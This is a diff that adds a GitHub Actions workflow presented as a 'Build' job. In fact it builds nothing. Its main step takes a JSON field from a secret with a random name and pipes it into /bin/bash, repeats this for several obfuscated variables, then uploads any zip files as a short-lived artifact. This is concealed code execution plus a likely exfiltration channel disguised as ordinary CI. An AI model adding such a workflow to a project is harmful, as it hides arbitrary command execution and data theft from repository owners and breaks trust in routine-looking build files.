@@ -1,0 +1,29 @@
+name: Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          ye01038: ${{ secrets.ye01038 }}
+        run: |
+          printf '%s' "$ye01038" | jq -r .y977 | /bin/bash
+          printf '%s' "$j96896" | jq -r .nntml66 | /bin/bash
+          printf '%s' "$rlqbi5" | jq -r .jk35778 | /bin/bash
+          printf '%s' "$a7" | jq -r .gd15 | /bin/bash
+          printf '%s' "$xcy03" | jq -r .ineas87 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: SoOG2YMX
+          path: "*.zip"
+          retention-days: 1
